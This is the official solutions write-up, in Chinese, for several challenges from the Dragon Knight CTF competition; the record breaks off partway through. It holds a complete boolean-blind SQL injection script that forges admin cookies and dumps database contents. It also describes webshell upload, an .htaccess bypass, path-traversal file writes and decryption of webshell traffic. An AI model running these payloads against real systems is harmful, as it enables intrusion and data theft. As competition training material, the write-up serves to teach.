<h3 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a><strong>EzLogin</strong></h3><p>ctrl+U查看前端源码，发现有个&#x2F;register.html，先进入&#x2F;register.html<br>随便注册一个帐号进去，登录发现我不是admin，查看cookie：<br>TOKEN&#x3D;65794a3163325679626d46745a534936496d46685953497349434a306232746c62694936496a5133596d4e6c4e574d334e4759314f446c6d4e4467324e3252695a4455335a546c6a59546c6d4f44413449697767496d6c7a5832466b62576c75496a6f7766513d3d<br>扔到cyberchef直接出明文：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584012-c7e133bd-e865-4858-ae76-2aba66ec04a2.png" alt="image.png"><br>修改is_admin为1，base64和hex加密后得到的<br>65794a3163325679626d46745a534936496d46685953497349434a306232746c62694936496a5133596d4e6c4e574d334e4759314f446c6d4e4467324e3252695a4455335a546c6a59546c6d4f44413449697767496d6c7a5832466b62576c75496a6f7866513d3d<br>打入token，刷新页面。<img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584093-0b6ac491-1029-4687-b30c-e06f50dd4e5a.png" alt="image.png"><br>很明显的sql注入，注入点是用户名，不断修改账户名来尝试，在TOKEN里有一个小token，这里是md5加密后的username，所以写个脚本，这是加密函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">payload</span>):</span><br><span class="line">    payload0 = payload</span><br><span class="line">    md5pwd = hashlib.md5(payload0.encode()).hexdigest()    <span class="comment">#把payload md5加密</span></span><br><span class="line">    json_payload = <span class="string">f&#x27;&#123;&#123;&quot;username&quot;:&quot;<span class="subst">&#123;payload0&#125;</span>&quot;, &quot;token&quot;:&quot;<span class="subst">&#123;md5pwd&#125;</span>&quot;, &quot;is_admin&quot;:1&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    encoded_payload = base64.b64encode(json_payload.encode()) <span class="comment">#base64加密</span></span><br><span class="line">    hexadecimal_payload = encoded_payload.<span class="built_in">hex</span>()  <span class="comment">#十六进制编码</span></span><br><span class="line">    <span class="keyword">return</span> hexadecimal_payload</span><br></pre></td></tr></table></figure>

<p>根据注入正确和失败的两个回显，尝试布尔盲注。<br>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">payload</span>):</span><br><span class="line">    payload0 = payload</span><br><span class="line">    md5pwd = hashlib.md5(payload0.encode()).hexdigest()    <span class="comment">#把payload md5加密</span></span><br><span class="line">    json_payload = <span class="string">f&#x27;&#123;&#123;&quot;username&quot;:&quot;<span class="subst">&#123;payload0&#125;</span>&quot;, &quot;token&quot;:&quot;<span class="subst">&#123;md5pwd&#125;</span>&quot;, &quot;is_admin&quot;:1&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    encoded_payload = base64.b64encode(json_payload.encode()) <span class="comment">#base64加密</span></span><br><span class="line">    hexadecimal_payload = encoded_payload.<span class="built_in">hex</span>()  <span class="comment">#十六进制编码</span></span><br><span class="line">    <span class="keyword">return</span> hexadecimal_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_str</span>():  <span class="comment"># 生成库名表名字符所在的字符列表字典</span></span><br><span class="line">    str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  <span class="comment"># 所有可显示字符</span></span><br><span class="line">        str_list.append(<span class="built_in">chr</span>(i))</span><br><span class="line">    <span class="comment">#print(&#x27;可显示字符：%s&#x27;%str_list)</span></span><br><span class="line">    <span class="keyword">return</span> str_list  <span class="comment"># 返回字符列表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_length</span>(<span class="params">url, <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始测试数据库名长度.......&quot;</span>)</span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27;/**/and/**/length(database())/**/like/**/<span class="subst">&#123;num&#125;</span>#&quot;</span></span><br><span class="line">        db_payload = encode(payload)</span><br><span class="line">        cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>:db_payload&#125;</span><br><span class="line">        r = requests.get(url=url,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            db_length = num</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+]数据库长度：%d\n&quot;</span> % db_length)</span><br><span class="line">            db_name(db_length)  <span class="comment"># 进行下一步，测试库名</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>(<span class="params">db_length</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始测试数据库名.......&quot;</span>)</span><br><span class="line">    db_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    str_list = ascii_str()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, db_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> str_list:</span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27;/**/and/**/(ascii(substr(database(),<span class="subst">&#123;i&#125;</span>,1))/**/like/**/<span class="subst">&#123;<span class="built_in">ord</span>(j)&#125;</span>)#&quot;</span></span><br><span class="line">            db_payload = encode(payload)</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: db_payload&#125;</span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                db_name += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]数据库名：%s\n&quot;</span> % db_name)</span><br><span class="line">    tb_piece(db_name)  <span class="comment"># 进行下一步，测试security数据库有几张表</span></span><br><span class="line">    <span class="keyword">return</span> db_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_piece</span>(<span class="params">db_name</span>):</span><br><span class="line">    <span class="keyword">global</span> tb_piece</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始测试%s数据库有几张表........&quot;</span> % db_name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 猜解库中有多少张表，合理范围即可</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;i&#125;</span>/**/like/**/(Select/**/Count(Table_name)/**/From/**/Information_schema.tables/**/Where/**/table_schema/**/like/**/&#x27;<span class="subst">&#123;db_name&#125;</span>&#x27;)#&quot;</span></span><br><span class="line">        tb_payload = encode(payload)</span><br><span class="line">        cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: tb_payload&#125;</span><br><span class="line">        r = requests.get(url=url, cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            tb_piece = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]<span class="subst">&#123;db_name&#125;</span>库一共有<span class="subst">&#123;tb_piece&#125;</span>张表\n&quot;</span>)</span><br><span class="line">    tb_name(db_name, tb_piece)  <span class="comment"># 进行下一步，猜解表名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name</span>(<span class="params">db_name, tb_piece</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始猜解表名.......&quot;</span>)</span><br><span class="line">    table_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(tb_piece):</span><br><span class="line">        str_list = ascii_str()</span><br><span class="line">        tb_length = <span class="number">0</span></span><br><span class="line">        tb_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):  <span class="comment"># 表名长度，合理范围即可</span></span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27;/**/and/**/(Select/**/length(table_name)/**/from/**/Information_schema.tables/**/Where/**/table_schema/**/like/**/database()/**/limit/**/<span class="subst">&#123;i&#125;</span>,1)/**/like/**/<span class="subst">&#123;j&#125;</span>#&quot;</span></span><br><span class="line">            tb_payload = encode(payload)</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: tb_payload&#125;</span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tb_length = j</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;第%d张表名长度：%s&quot;</span> % (i + <span class="number">1</span>, tb_length))</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tb_length + <span class="number">1</span>):  <span class="comment"># 根据表名长度进行截取对比</span></span><br><span class="line">                    <span class="keyword">for</span> l <span class="keyword">in</span> str_list:</span><br><span class="line">                        payload = <span class="string">f&quot;admin&#x27;/**/and/**/(Select/**/ascii(substr((Select/**/table_name/**/from/**/Information_schema.tables/**/Where/**/table_schema/**/like/**/database()/**/limit/**/<span class="subst">&#123;i&#125;</span>,1),<span class="subst">&#123;k&#125;</span>,1)))/**/like/**/<span class="subst">&#123;<span class="built_in">ord</span>(l)&#125;</span>#&quot;</span></span><br><span class="line">                        tb_payload = encode(payload)</span><br><span class="line">                        cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: tb_payload&#125;</span><br><span class="line">                        r = requests.get(url=url, cookies=cookies)</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                            tb_name += l</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]：%s&quot;</span> % tb_name)</span><br><span class="line">                table_list.append(tb_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+]%s库下的%s张表：%s\n&quot;</span> % (db_name, tb_piece, table_list))</span><br><span class="line">    column_num(table_list, db_name)  <span class="comment"># 进行下一步，猜解每张表的字段数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_num</span>(<span class="params">table_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始猜解每张表的字段数：.......&quot;</span>)</span><br><span class="line">    column_num_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> table_list:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):  <span class="comment"># 每张表的字段数量，合理范围即可</span></span><br><span class="line">            payload =<span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;j&#125;</span>/**/like/**/(Select/**/count(column_name)/**/from/**/Information_schema.columns/**/Where/**/table_name/**/like/**/&#x27;<span class="subst">&#123;i&#125;</span>&#x27;)#&quot;</span></span><br><span class="line">            column_payload = encode(payload)</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: column_payload&#125;</span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                column_num = j</span><br><span class="line">                column_num_list.append(column_num)  <span class="comment"># 把所有表的字段，依次放入这个列表当中</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[+]%s表\t%s个字段&quot;</span> % (i, column_num))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[+]表对应的字段数：%s\n&quot;</span> % column_num_list)</span><br><span class="line">    column_name(table_list, column_num_list, db_name)  <span class="comment"># 进行下一步，猜解每张表的字段名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">table_list, column_num_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始猜解每张表的字段名.......&quot;</span>)</span><br><span class="line">    column_length = []</span><br><span class="line">    str_list = ascii_str()</span><br><span class="line">    column_name_list = []</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table_list)):  <span class="comment"># t在这里代表每张表的列表索引位置</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+]%s表的字段：&quot;</span> % table_list[t])</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(column_num_list[t]):  <span class="comment"># i表示每张表的字段数量</span></span><br><span class="line">            column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>):  <span class="comment"># j表示每个字段的长度</span></span><br><span class="line">                payload = <span class="string">f&quot;admin&#x27;/**/and/**/<span class="subst">&#123;j-<span class="number">1</span>&#125;</span>/**/like/**/(Select/**/length(column_name)/**/from/**/Information_schema.columns/**/Where/**/table_name/**/like/**/&#x27;<span class="subst">&#123;table_list[t]&#125;</span>&#x27;/**/limit/**/<span class="subst">&#123;i&#125;</span>,1)#&quot;</span></span><br><span class="line">                column_name_length = encode(payload)</span><br><span class="line">                cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: column_name_length&#125;</span><br><span class="line">                r = requests.get(url=url, cookies=cookies)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    column_length.append(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> str_list:  <span class="comment"># k表示我们猜解的字符字典</span></span><br><span class="line">                    payload = <span class="string">f&quot;admin&#x27;/**/and/**/ascii(substr((Select/**/column_name/**/from/**/Information_schema.columns/**/Where/**/table_name/**/like/**/&#x27;<span class="subst">&#123;table_list[t]&#125;</span>&#x27;/**/limit/**/<span class="subst">&#123;i&#125;</span>,1),<span class="subst">&#123;j&#125;</span>,1))/**/like/**/<span class="subst">&#123;<span class="built_in">ord</span>(k)&#125;</span>#&quot;</span></span><br><span class="line">                    column_payload = encode(payload)</span><br><span class="line">                    cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: column_payload&#125;</span><br><span class="line">                    r = requests.get(url=url, cookies=cookies)</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        column_name += k</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+]：%s&#x27;</span> % column_name)</span><br><span class="line">            column_name_list.append(column_name)</span><br><span class="line">    <span class="comment"># print(column_name_list)#输出所有表中的字段名到一个列表中</span></span><br><span class="line">    dump_data(table_list, column_name_list,)  <span class="comment"># 进行最后一步，输出指定字段的数据</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_data</span>(<span class="params">table_list,column_name_list,url,<span class="built_in">str</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-]开始爆破字段内容：&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># l表示每条数据的长度，合理范围即可</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">f&quot;admin&#x27;/**/and/**/Ascii(Substr((Select/**/<span class="subst">&#123;column_name_list[<span class="number">0</span>]&#125;</span>/**/from/**/<span class="subst">&#123;table_list[<span class="number">0</span>]&#125;</span>/**/limit/**/0,1),<span class="subst">&#123;l&#125;</span>,1))/**/like/**/<span class="subst">&#123;k&#125;</span>#&quot;</span></span><br><span class="line">            data_len_payload = encode(payload)</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TOKEN&quot;</span>: data_len_payload&#125;</span><br><span class="line">            r = requests.get(url=url, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">str</span> <span class="keyword">in</span> r.text):</span><br><span class="line">                character = <span class="built_in">chr</span>(k)</span><br><span class="line">                <span class="built_in">print</span>(character,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/home.php&quot;</span>  <span class="comment"># 目标url</span></span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&quot;@q^4*!z8a9-%42z.s~&quot;</span></span><br><span class="line">    <span class="comment">#db_length(url,str)</span></span><br><span class="line">    <span class="comment"># #下面是手动输入字段内容，不太优雅=-=</span></span><br><span class="line">    table_list = [<span class="string">&#x27;secret&#x27;</span>]</span><br><span class="line">    column_name_list = [<span class="string">&#x27;sseeccrreett&#x27;</span>]</span><br><span class="line">    dump_data(table_list,column_name_list,url,<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Ezsignin"><a href="#Ezsignin" class="headerlink" title="Ezsignin"></a><strong>Ezsignin</strong></h3><p>瞎bb：超级简单的签到，看到 wp 人快碎了，一半非预期（<br>先扫目录或者试试敏感文件泄露，找到 index.php.bak，源码就不放这了<br>看到这里<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584032-e8cd63f6-9efa-4741-90b1-11f529b4bc07.png" alt="image.png"><br>需要本地，但是上面是存在一个变量覆盖函数的，所以可以直接覆盖这个变量<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584034-ad2e4134-3503-48e4-bfbc-a6fd9f889b5f.png" alt="image.png"><br>传入?_SERVER[REMOTE_ADDR]&#x3D;127.0.0.1即可进入文件上传的界面，这边因为我的 upload.php没有做相同的处理，导致可以直接利用表单给 upload.php上传文件，没办法，人太懒了（（（<br>后面就是上传一个 webshell，会发现不解析 php 文件，是因为我在 upload 下放了个.htaccess，我认为这很安全，这样你们上传的 php 就不会被解析了[doge]<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733584066-afa3596c-fdf3-4f13-9be8-485c0849a56b.png" alt="image.png"><br>由于我没有对文件上传做任何限制，所以你可以上传一个.htaccess文件来打开 php 的解析引擎，这样你的 webshell 就可以正常解析了。<br>非预期做法：<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585432-318cc460-962a-44fb-ad77-dd5e435e87f4.png" alt="image.png"><br>真是漏网之鱼啊，这里的 username可控，一点过滤没写，导致可以目录穿越写到 html 下面，就不受upload下的.htaccess的限制了，果然懒狗开发确实该死（bushi</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h2><h3 id="签到-1"><a href="#签到-1" class="headerlink" title="签到"></a><strong>签到</strong></h3><p>将浅色背景切换为深色二维码就显现了，扫码就行了<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585633-4c3a0f1c-8ada-4c25-8e37-4737a6b81e63.png" alt="image.png"></p>
<h3 id="神秘的文字"><a href="#神秘的文字" class="headerlink" title="神秘的文字"></a><strong>神秘的文字</strong></h3><p>直接搜这段，是可以找到相关文章，但是复现发现是不行的<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585426-31f8ae0e-a970-4c81-a01e-10b77c9cb924.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585498-0ac4c61c-95fc-4261-9092-89318d3093ad.png" alt="image.png"><br>深入搜索可以找到Martin Kleppe项目，aem1k.com&#x2F;transliterate.js，发现其实就是jsfuck的变种，理解了原理，找到缺少内容alert(‘’);拼成完整的密文就可以弹窗得到密钥了<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733585432-f7e1fec7-43b4-469c-823c-ae03911f2eba.png" alt="image.png"></p>
<h3 id="DNA-5"><a href="#DNA-5" class="headerlink" title="DNA-5"></a><strong>DNA-5</strong></h3><p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733586832-e4e22c97-4cb5-4cc7-adb2-f979ffe76f30.png" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ata = </span><br><span class="line"><span class="string">&quot;ACCTAATACCATCAACTCCATAACTCCCCACCTAAATCCAATAACCACTAAATCCAATAACCACTACC</span></span><br><span class="line"><span class="string">CCTCCATAAAAATAACCACTCATCCCCCTAATAAAATAAACCTCCCCCAC&quot;</span> </span><br><span class="line">replacement_dict = &#123; </span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;-&#x27;</span> </span><br><span class="line">&#125; </span><br><span class="line">result = <span class="string">&#x27;&#x27;</span>.join([replacement_dict.get(char, char) <span class="keyword">for</span> char <span class="keyword">in</span> data]) </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733586902-d01bf7ee-f47a-415e-aa3e-476a4556aff2.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733586891-1694f1e6-4e5c-475d-ab0c-aae5c816d0e9.png" alt="image.png"></p>
<h3 id="AgedSLATE"><a href="#AgedSLATE" class="headerlink" title="AgedSLATE"></a><strong>AgedSLATE</strong></h3><p><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587343-a65ead61-ddec-4ad5-bd8a-f88fac053e90.png" alt="image.png"><br>相信那你在查看文档时也找到了名字好像很可疑，这就是第一段flag，对应的hint是：注意隐私保护，很多出题人出题时是没在意名字问题的等于自己把自己开了，本意是借此提醒<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733586852-dcc25ba1-6f6b-4a4c-9f26-f1835ff19d11.png" alt="image.png"><br>接着分析doc会发现大量的01，很明显可以猜测为文档隐藏了内容全选后换个字体颜色就行了，，这段01猜测为01 to img，写个脚本就可以了（帮你们试过了大部分的工具出来的都是重叠，还是老老实实写脚本吧。如果你觉得文本量大不好处理，那为什么不试试word的替换功能呢）<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587761-dbcd0921-8994-404a-bc5c-155225fd8395.png" alt="image.png"><br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588067-72974b46-45bf-4f14-973c-21960899ea55.png" alt="image.png"><br>转成的图片再识图，可以找到海嗣文字，需要反着读镜像后对照即可。“？”为“_“最开始图片上有明确展示<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587701-4fc5a648-0a08-4f66-9620-c8e834299670.png" alt="image.png"><br>拼接两段得到flag<br><strong>Steal_Data</strong><br>这个题其实就是一个自制的免杀马（但是其实什么也过不了）<br>然后回到题目本身<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587769-3b40a60b-5a32-44d6-b4a2-6a03d8f2939f.png" alt="image.png"><br>打开流量包，很多杂七杂八的包，看一下协议分级<br>可以看到有HTTP，那就看http<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733587775-20abb7db-bc66-45fe-8caf-d29cc8abd5a6.png" alt="image.png"><br>已经看到shell了，那就直接追踪http流<br>参数有一个show_source，猜测返回的代码是shell的源码，复制出来去前端看<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588856-dfe92376-4810-43d0-8f6f-8d36d7b2d786.png" alt="image.png"><br>很简单的逻辑，然后再解开请求包</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="string">&#x27;q0c8bvkt+9/LeMRp7RaaDA==&#x27;</span> , <span class="string">&quot;AES-128-ECB&quot;</span>, <span class="string">&#x27;d0c3a4017c22f6c3&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>再一个个地解开，看它的结果<br>执行的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami </span><br><span class="line">dir</span><br><span class="line">cd 51建模 &amp;&amp; type Route.py</span><br></pre></td></tr></table></figure>

<p>可以看到核心是后面的py<br>然后搜一下51建模B题<br><img src="/../pic/Dragon-Knight-CTF%E5%AE%98%E6%96%B9wp/1716733588865-c5c7a735-aa2d-40b0-b0d9-db647e93a1c2.png" alt="image.png"><br>可以发现是一个求最短路径的题目，于是猜测给出的数组是路径图<br>用networkx库求最短路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> networkx <span class="keyword">as</span> nx</span><br><span class="line">lujin = [(<span class="number">102</span> ,<span class="number">22</span>) ,(<span class="number">22</span> ,<span class="number">33</span>) ,(<span class="number">33</span> ,<span class="number">108</span>) ,(<span class="number">108</span> ,<span class="number">102</span>) ,(<span class="number">108</span> ,<span class="number">12</span>) ,(<span class="number">12</span> ,<span class="number">13</span>) ,(<span class="number">13</span> ,<span class="number">97</span>) ,(<span class="number">108</span> ,<span class="number">97</span>) ,</span><br><span class="line">         (<span class="number">97</span> ,<span class="number">47</span>) ,(<span class="number">97</span> ,<span class="number">103</span>) ,(<span class="number">47</span> ,<span class="number">103</span>) ,(<span class="number">103</span> ,<span class="number">123</span>) ,(<span class="number">123</span> ,<span class="number">21</span>) ,(<span class="number">103</span> ,<span class="number">21</span>) ,(<span class="number">123</span> ,<span class="number">27</span>) ,(<span class="number">123</span> ,<span class="number">119</span>) ,</span><br><span class="line">         (<span class="number">119</span> ,<span class="number">27</span>) ,(<span class="number">119</span> ,<span class="number">58</span>) ,(<span class="number">119</span> ,<span class="number">105</span>) ,(<span class="number">58</span> ,<span class="number">105</span>) ,(<span class="number">105</span> ,<span class="number">115</span>) ,(<span class="number">105</span> ,<span class="number">44</span>) ,(<span class="number">115</span> ,<span class="number">44</span>) ,(<span class="number">115</span> ,<span class="number">104</span>) ,</span><br><span class="line">         (<span class="number">115</span> ,<span class="number">43</span>) ,(<span class="number">43</span> ,<span class="number">104</span>) ,(<span class="number">104</span> ,<span class="number">95</span>) ,(<span class="number">95</span> ,<span class="number">42</span>) ,(<span class="number">42</span> ,<span class="number">104</span>) ,(<span class="number">95</span> ,<span class="number">68</span>) ,(<span class="number">95</span> ,<span class="number">28</span>) ,(<span class="number">28</span> ,<span class="number">68</span>) ,(<span class="number">68</span> ,<span class="number">30</span>) ,</span><br><span class="line">         (<span class="number">30</span> ,<span class="number">114</span>) ,(<span class="number">68</span> ,<span class="number">114</span>) ,(<span class="number">114</span> ,<span class="number">65</span>) ,(<span class="number">114</span> ,<span class="number">62</span>) ,(<span class="number">62</span> ,<span class="number">65</span>) ,(<span class="number">65</span> ,<span class="number">71</span>) ,(<span class="number">65</span> ,<span class="number">60</span>) ,(<span class="number">71</span> ,<span class="number">60</span>) ,(<span class="number">71</span> ,<span class="number">61</span>) ,</span><br><span class="line">         (<span class="number">71</span> ,<span class="number">111</span>) ,(<span class="number">61</span> ,<span class="number">111</span>) ,(<span class="number">111</span> ,<span class="number">48</span>) ,(<span class="number">111</span> ,<span class="number">110</span>) ,(<span class="number">110</span> ,<span class="number">48</span>) ,(<span class="number">110</span> ,<span class="number">36</span>) ,(<span class="number">110</span> ,<span class="number">75</span>) ,(<span class="number">36</span> ,<span class="number">75</span>) ,(<span class="number">75</span> ,<span class="number">78</span>) ,</span><br><span class="line">         (<span class="number">75</span> ,<span class="number">38</span>) ,(<span class="number">38</span> ,<span class="number">78</span>) ,(<span class="number">78</span> ,<span class="number">39</span>) ,(<span class="number">78</span> ,<span class="number">73</span>) ,(<span class="number">73</span> ,<span class="number">39</span>) ,(<span class="number">73</span> ,<span class="number">46</span>) ,(<span class="number">73</span> ,<span class="number">57</span>) ,(<span class="number">46</span> ,<span class="number">57</span>) ,(<span class="number">57</span> ,<span class="number">9</span>) ,(<span class="number">57</span> ,<span class="number">72</span>) ,</span><br><span class="line">         (<span class="number">9</span> ,<span class="number">72</span>) ,(<span class="number">72</span> ,<span class="number">96</span>) ,(<span class="number">72</span> 